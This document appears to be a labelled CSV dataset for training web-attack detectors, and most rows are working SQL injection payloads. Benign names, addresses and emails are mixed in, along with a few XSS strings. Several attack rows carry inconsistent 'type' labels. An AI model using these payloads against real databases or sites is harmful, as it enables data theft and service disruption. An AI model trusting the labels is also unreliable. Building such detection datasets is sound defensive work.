Text,attack_type,Label,type
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""%""=""",sqli,1,sql
"-8793' where 3853=3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",sqli,1,sql
zandt@adondeir.az,norm,0,normal
"1) where 2741=2741 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
brewer,norm,0,normal
1')));select case when 2948=7279 then 1 else null end--,sqli,1,sql
yie-tarn,norm,0,normal
"1"") where 4567=4567 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
9429551402633786,norm,0,normal
40467,norm,0,normal
"1"") where 9285=9285 and 8506=8343#",sqli,1,normal
florescu,norm,0,normal
"-9676 or elt(1032=1032,3623)# jcaq",sqli,1,normal
adulatorio,norm,0,normal
"1')) and elt(3053=9778,9778) and (('yfaa' like 'yfaa",sqli,1,normal
1') and (3020=3020)*6703 and ('botl' like 'botl,sqli,1,normal
87053274e,norm,0,normal
-5250) where 1591=1591 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
"do cotaredo, 147 9e",norm,0,normal
"1"") where 4849=4849 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)-- xsob",sqli,1,sql
"1"") as crek where 6570=6570 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
viao bagudanc,norm,0,normal
1'||(select 'hshf' where 9073=9073 and 7533=7533)||',sqli,1,sql
"<a href=""http://server.com/"">crosssitescripting</a>",xss,2,normal
terhune@multireform.tn,norm,0,normal
naut aran,norm,0,normal
cindra,norm,0,normal
regidor fa,norm,0,normal
marrocchi,norm,0,normal
-8836%') or 4856=3891,sqli,1,normal
59529079l,norm,0,normal
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
-2992')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('tjgt'='tjgt,sqli,1,sql
1%' order by 1--,sqli,1,sql
margarit,norm,0,normal
asawa,norm,0,normal
esmilcea,norm,0,normal
broussar,norm,0,normal
zo,norm,0,normal
1479,norm,0,normal
zarra,norm,0,normal
1');begin user_lock.sleep(5); end,sqli,1,sql
15365381r,norm,0,normal
aylln tamallangos,norm,0,normal
8704154782235200,norm,0,normal
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",sqli,1,sql
e4can7ilader0,norm,0,normal
simon@sms24h.pg,norm,0,normal
osada,norm,0,normal
38844,norm,0,normal
amann 132,norm,0,normal
-6165%')) union all select 5384#,sqli,1,sql
-1479%' or 5201=3398--,sqli,1,sql
nima,norm,0,normal
"realejos, los",norm,0,normal
"1 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
kory,norm,0,normal
massaguer molin,norm,0,normal
cambulln,norm,0,normal
c.0c4r1,norm,0,normal
1940,norm,0,normal
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",sqli,1,sql
sielanski@prestamosypersonales.bj,norm,0,normal
myrna5@adondeir.at,norm,0,normal
"-9923%'))) union all select 8985,8985,8985,8985,8985,8985,8985#",sqli,1,sql
"1"";select (case when (1961=2048) then 1961 else 1961*(select 1961 from information_schema.character_sets) end)#",sqli,1,sql
gioiosa isasi,norm,0,normal
"-5998%"") union all select 2366,2366,2366,2366#",sqli,1,sql
mabby,norm,0,normal
08693,norm,0,normal
96815806c,norm,0,normal
1' in boolean mode) union all select null#,sqli,1,sql
15142,norm,0,normal
calle la rambla s/n 4?d,norm,0,normal
"1"";select (case when (1354=7529) then 1354 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
jannings_corrigan@castigadas.gm,norm,0,normal
"chorrito bajo, 11",norm,0,normal
avellanosa de mu,norm,0,normal
8322,norm,0,normal
"1"") as frmp where 6073=6073;select (case when (8689=2468) then 8689 else 1/(select 0) end)--",sqli,1,sql
lierde.vaverka@2horas.wf,norm,0,normal
paulet ajau,norm,0,normal
mairozio,norm,0,normal
einstein@shamballa-pneuma.st,norm,0,normal
hsien,norm,0,normal
baos vilarrasa,norm,0,normal
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('xngr'='xngr",sqli,1,normal
leo,norm,0,normal
1959107690181502,norm,0,normal
tajamar,norm,0,normal
tetreaul7,norm,0,normal
infiltracin,norm,0,normal
1)) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((5281=5281,sqli,1,sql
ferne,norm,0,normal
eduardo,norm,0,normal
1);select sleep(5)#,sqli,1,sql
"1"" and 2006=2006",sqli,1,normal
"1') where 8291=8291;select * from generate_series(5980,5980,case when (5980=5063) then 1 else 0 end) limit 1--",sqli,1,sql
flack@asociaciondearquitectoslatinoamericanos.mobi,norm,0,normal
drought,norm,0,normal
"1"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""rvuz"" like ""rvuz",sqli,1,sql
moriego,norm,0,normal
34491,norm,0,normal
"c/ andorra, 71",norm,0,normal
1')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('mmfq'='mmfq,sqli,1,sql
"1%' union all select null,null,null,null,null,null#",sqli,1,sql
calle arquitecto francisco bautista 4 1c,norm,0,normal
77000029p,norm,0,normal
63eb2ya,norm,0,normal
"-3518) union all select 1877,1877,1877,1877#",sqli,1,sql
"1'||(select 'dbxr' where 4014=4014 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
mximo,norm,0,normal
despestaar,norm,0,normal
remo,norm,0,normal
"1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""kcxw""=""kcxw",sqli,1,sql
77,norm,0,normal
0769789407660165,norm,0,normal
"1"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
sternikova@clo2.mg,norm,0,normal
1858,norm,0,normal
d119a,norm,0,normal
marieau8@clementelr.nz,norm,0,normal
"1%'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('%'='",sqli,1,sql
"camino torrecilla, 42,",norm,0,normal
swinton@voragolive.kz,norm,0,normal
1)) as rvex where 3462=3462 and 4595=4595#,sqli,1,normal
quek,norm,0,normal
"-1043"") where 4207=4207 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
3o22ciabl3,norm,0,normal
-1772' or 7911=4985#,sqli,1,normal
blount,norm,0,normal
"1"" where 9083=9083 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
monette,norm,0,normal
1))) rlike sleep(5)#,sqli,1,normal
0496158701394687,norm,0,normal
yoon-mo,norm,0,normal
lugar canedo s/n 13h,norm,0,normal
cobradora,norm,0,normal
2812,norm,0,normal
blascosancho,norm,0,normal
johan,norm,0,normal
"c/ fontans, 124, 10?c",norm,0,normal
povedilla,norm,0,normal
5083,norm,0,normal
calle magnolia 157,norm,0,normal
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
"eliseo pinedo lopez, 195, 11-d",norm,0,normal
"1%""))) union all select null,null,null,null--",sqli,1,sql
selles tanari,norm,0,normal
"-8034"" or 8571=8571--",sqli,1,sql
1 rlike sleep(5)-- muhp,sqli,1,sql
"1 and elt(1210=1210,sleep(5))-- ommf",sqli,1,sql
nufrago,norm,0,normal
"c/ rodenas 170, 11?g",norm,0,normal
09133,norm,0,normal
1834523414581384,norm,0,normal
50174,norm,0,normal
9009008887787551,norm,0,normal
8alantos4,norm,0,normal
-6764') or 2314=2017--,sqli,1,sql
cuz,norm,0,normal
young-ba,norm,0,normal
flicking,norm,0,normal
verdi,norm,0,normal
9464,norm,0,normal
1';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
c/ moriles 91,norm,0,normal
"1'))) union all select null,null,null,null,null--",sqli,1,sql
prado de la guzpea,norm,0,normal
lantarn,norm,0,normal
"paso de la soledad, 130 10?f",norm,0,normal
87337571q,norm,0,normal
3615,norm,0,normal
jyuo,norm,0,normal
llinars del valls,norm,0,normal
"1)) as aqpy where 4027=4027 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
69634281x,norm,0,normal
gherardo,norm,0,normal
calle correa de arauxo 176,norm,0,normal
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""azzv"" like ""azzv",sqli,1,sql
leafloor,norm,0,normal
"1') where 6387=6387 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
40315,norm,0,normal
"1' or elt(6272=6272,sleep(5)) and 'fvtf' like 'fvtf",sqli,1,normal
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'ugum' like 'ugum",sqli,1,sql
"selva del camp, la",norm,0,normal
kokosopo,norm,0,normal
"rec 64,",norm,0,normal
egle,norm,0,normal
anhidro,norm,0,normal
7766,norm,0,normal
29320,norm,0,normal
cardea,norm,0,normal
gamal,norm,0,normal
"1"")) as hace where 8785=8785;begin user_lock.sleep(5); end--",sqli,1,sql
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('iixp'='iixp",sqli,1,sql
cary-whitten@magritte.pe,norm,0,normal
"1)) as ehlg where 6340=6340;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
44520,norm,0,normal
abaeto sanchon,norm,0,normal
aparencia,norm,0,normal
"1"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
weihs,norm,0,normal
1)));select sleep(5) and (((8354=8354,sqli,1,sql
"1') where 8274=8274;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"c/ francisco de orellana 121, 5-e",norm,0,normal
kaitlynn,norm,0,normal
"1));iif(5257=5257,1,1/0)",sqli,1,sql
idalio,norm,0,normal
hungkang,norm,0,normal
espronceda,norm,0,normal
9965289480263638,norm,0,normal
"1"")) as eagr where 3366=3366 and elt(4249=4249,7259)--",sqli,1,sql
"1)) as mgvw where 4923=4923 union all select null,null,null,null--",sqli,1,sql
1'));waitfor delay '0:0:5' and (('uvlf'='uvlf,sqli,1,sql
03150,norm,0,normal
yescas feal,norm,0,normal
95328463h,norm,0,normal
28590,norm,0,normal
43364,norm,0,normal
baily,norm,0,normal
3m6noja4,norm,0,normal
granera,norm,0,normal
"1 where 5466=5466 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"calle la corta, 85",norm,0,normal
rigente,norm,0,normal
grimble,norm,0,normal
"1'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('gbhd'='gbhd",sqli,1,normal
saprtich@seramitex.sv,norm,0,normal
obn,norm,0,normal
1'+(select 'qylf' where 6984=6984 and 2255=5094,sqli,1,sql
"1%'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('%'='",sqli,1,sql
2417,norm,0,normal
"1) as hhly where 2906=2906;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1""))) union all select null,null--",sqli,1,sql
1') where 2763=2763;(select * from (select(sleep(5)))srmq)--,sqli,1,sql
95726092t,norm,0,normal
sa89gn,norm,0,normal
6866,norm,0,normal
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"1))) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
cabrea_r,norm,0,normal
18518,norm,0,normal
1052,norm,0,normal
26381112c,norm,0,normal
6486,norm,0,normal
barrena,norm,0,normal
"1'||(select 'fpfl' from dual where 1434=1434 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",sqli,1,sql
casilda,norm,0,normal
orquestra,norm,0,normal
wittik,norm,0,normal
"1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""smhd"" like ""smhd",sqli,1,normal
c/ manresa 56 2-e,norm,0,normal
02879028a,norm,0,normal
1')));begin dbms_lock.sleep(5); end and ((('hwrs' like 'hwrs,sqli,1,sql
73,norm,0,normal
lugar grela 152 1?f,norm,0,normal
fontbern maurici,norm,0,normal
"<meta http-equiv=""link"" content=""<http://ha.ckers.org/xss.css>; rel=stylesheet"">",xss,2,sql
6769,norm,0,normal
"las delicias 20,",norm,0,normal
peller@arvigar.gs,norm,0,normal
"1))) union all select null,null,null,null--",sqli,1,sql
19784273h,norm,0,normal
fermn,norm,0,normal
"-1134"" union all select 4865,4865,4865,4865,4865#",sqli,1,sql
presbiteriano,norm,0,normal
7758975220981278,norm,0,normal
"-2323"") as zgsn where 9274=9274 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,sql
30,norm,0,normal
anys@ebuy.com.tr,norm,0,normal
1) where 4653=4653 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
